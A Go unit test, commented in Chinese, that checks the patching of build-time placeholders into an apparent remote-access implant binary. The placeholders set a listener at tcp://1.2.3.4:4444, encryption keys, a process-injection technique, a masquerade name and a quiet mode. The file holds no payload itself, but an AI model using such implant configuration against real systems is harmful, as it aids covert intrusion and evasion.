package delivery

import (
	"bytes"
	"strings"
	"testing"
)

// TestPatchOPSECPlaceholders 验证 OPSEC 编译期配置占位符替换
func TestPatchOPSECPlaceholders(t *testing.T) {
	// 构造一个包含全部新占位符的假模板
	fake := []byte(strings.Repeat("X", 4096))
	fake = bytes.ReplaceAll(fake, []byte("X"), []byte(" "))
	placeholders := []string{
		"LISTENER_MASTER_KEY_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"LISTENER_SALT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"RECONNECT_BASE_DELAY_PLACEHOLDER_12345",
		"RECONNECT_MAX_RETRIES_PLACEHOLDER_12345",
		"INJECT_TECH_DEFAULT_PLACEHOLDER_12345",
		"MASQUERADE_NAME_PLACEHOLDER_12345",
		"QUIET_MODE_PLACEHOLDER_12345",
		"HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"HEARTBEAT_INTERVAL_PLACEHOLDER_12345",
	}
	var bin []byte
	for _, ph := range placeholders {
		bin = append(bin, []byte(ph)...)
	}
	bin = append(bin, []byte(strings.Repeat("Y", 512))...)

	out, err := PatchClientBinary(bin, PatchOptions{
		ListenerConfig:      "tcp://1.2.3.4:4444",
		OS:                  "windows",
		Arch:                "amd64",
		Pass:                "",
		VKey:                "0123456789abcdef0123456789abcdef",
		EncryptSalt:         "0123456789abcdef",
		JitterPercent:       "20",
		ReconnectBaseDelay:  "3",
		ReconnectMaxRetries: "30",
		InjectTechDefault:   "ntc",
		MasqueradeName:      "winx",
		QuietMode:           "1",
	})
	if err != nil {
		t.Fatalf("patch err: %v", err)
	}
	s := string(out)
	for _, ph := range placeholders {
		if strings.Contains(s, ph) {
			t.Fatalf("占位符未替换: %s", ph)
		}
	}
	for _, want := range []string{"winx", "3  ", "30 ", "ntc"} {
		trimmed := strings.TrimSpace(want)
		if !strings.Contains(s, trimmed) {
			// 值可能被空格填充，检查前缀
			if !strings.Contains(s, strings.TrimSpace(want)+" ") && !strings.Contains(s, strings.TrimSpace(want)) {
				t.Fatalf("替换值缺失: %q", want)
			}
		}
	}
}
